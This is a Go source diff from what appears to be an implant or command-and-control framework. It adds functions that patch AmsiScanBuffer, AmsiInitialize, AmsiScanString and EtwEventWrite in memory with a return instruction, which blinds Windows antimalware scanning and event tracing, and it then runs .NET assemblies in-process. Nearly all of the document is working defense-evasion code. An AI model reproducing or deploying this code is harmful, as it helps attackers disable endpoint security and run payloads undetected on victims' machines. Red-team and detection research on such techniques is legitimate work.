@@ -200,6 +200,96 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
+func patchAmsi() error {
+	// load amsi.dll
+	amsiDLL := windows.NewLazyDLL("amsi.dll")
+	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
+	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
+	amsiScanString := amsiDLL.NewProc("AmsiScanString")
+
+	// patch
+	amsiAddr := []uintptr{
+		amsiScanBuffer.Addr(),
+		amsiInitialize.Addr(),
+		amsiScanString.Addr(),
+	}
+	patch := byte(0xC3)
+	for _, addr := range amsiAddr {
+		// skip if already patched
+		if *(*byte)(unsafe.Pointer(addr)) != patch {
+			// {{if .Config.Debug}}
+			log.Println("Patching AMSI")
+			// {{end}}
+			var oldProtect uint32
+			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect failed:", err)
+				//{{end}}
+				return err
+			}
+			*(*byte)(unsafe.Pointer(addr)) = 0xC3
+			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect (restauring) failed:", err)
+				//{{end}}
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+func patchEtw() error {
+	ntdll := windows.NewLazyDLL("ntdll.dll")
+	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
+
+	// patch
+	patch := byte(0xC3)
+	// skip if already patched
+	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
+		// {{if .Config.Debug}}
+		log.Println("Patching ETW")
+		// {{end}}
+		var oldProtect uint32
+		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect failed:", err)
+			//{{end}}
+			return err
+		}
+		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
+		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect (restauring) failed:", err)
+			//{{end}}
+			return err
+		}
+	}
+	return nil
+}
+
+func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
+	if amsiBypass {
+		err := patchAmsi()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	if etwBypass {
+		err := patchEtw()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
+}
+
 func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
 	var (
 		stdoutBuf, stderrBuf bytes.Buffer
